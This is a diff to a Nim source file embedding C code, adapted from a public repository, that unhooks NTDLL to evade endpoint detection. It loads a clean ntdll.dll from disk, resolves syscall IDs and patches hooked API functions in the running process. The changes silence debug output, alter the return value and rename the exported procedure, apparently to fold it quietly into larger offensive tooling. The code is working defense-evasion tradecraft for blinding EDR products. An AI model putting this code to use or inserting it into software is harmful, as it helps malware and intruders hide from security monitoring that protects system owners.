@@ -1,6 +1,8 @@
 # Source: https://github.com/Mr-Un1k0d3r/EDRs/blob/main/unhook_bof.c
 # A few slight changes were made, removing beacon-specific code and resolvers as well as ETW patching (done elsewhere)
 
+# TODO: remove print statements and deps, cleanup display code.
+
 {.emit: """
 
 #include <Windows.h>
@@ -38,9 +40,11 @@ VOID PatchAPI(VOID *lib, CHAR *name, HANDLE hDll, BOOL *displayed) {
     DWORD* functions = base + OffsetFunctions;
 
 	if(!*displayed) {
+    /*
 		printf("------------------------------------------\nBASE\t\t\t0x%p\t%s\nPE\t\t\t0x%p\t%s\nExportTableOffset\t\t0x%p\nOffsetNameTable\t\t0x%p\nOrdinalTable\t\t0x%p\nFunctionTable\t\t0x%p\nFunctions Count\t\t0x%x (%d)\n------------------------------------------\n",
 		base, base, PE, PE, ExportDirectory, OffsetNamesTable, ordinals, functions, dwFunctionsCount, dwFunctionsCount);
 		*displayed = TRUE;
+    */
 	}
 	
     for(dwIter; dwIter < dwFunctionsCount - 1; dwIter++) {
@@ -57,7 +61,7 @@ VOID PatchAPI(VOID *lib, CHAR *name, HANDLE hDll, BOOL *displayed) {
 			
             FARPROC toPatchAddr = GetProcAddress(hDll, name);
 			
-			printf("%s syscall ID is 0x%02x%02x. Real %s is at 0x%p\n", name, (unsigned char)high, (unsigned char)id, name, toPatchAddr);
+			//printf("%s syscall ID is 0x%02x%02x. Real %s is at 0x%p\n", name, (unsigned char)high, (unsigned char)id, name, toPatchAddr);
 			
             PatchHook(toPatchAddr, id, high);
             break;
@@ -80,15 +84,11 @@ VOID PatchHook(CHAR* address, unsigned char id, char high) {
 }
 
 int go(char *args, int length) {
-	printf("Loading the unhooking module\n");
-
     CHAR dll[] = "C:\\windows\\system32\\ntdll.dll";
     HANDLE hFile = NULL;
     HANDLE hMap = NULL;
     HANDLE hDll = LoadLibrary(dll);
 	BOOL displayed = FALSE;
-	
-    printf("Opening %s\n", dll);
 	
     VOID *data = GetFileFromDisk(dll, &hFile, &hMap);
     
@@ -132,15 +132,14 @@ int go(char *args, int length) {
 
   CloseHandle(hFile);
   CloseHandle(hMap);
-	 
-	printf("Everything should be unhooked in the process with PID: %d\n", GetCurrentProcessId());
+  //printf("NTDLL unhooked in PID: %d\n", GetCurrentProcessId());
 
-  return 0;
+  return 1;
 }
 
 """.}
 
-proc UnhookNTDLL*(): int
+proc unhookNTDLL*(): int
     {.importc: "go", nodecl.}
 
 
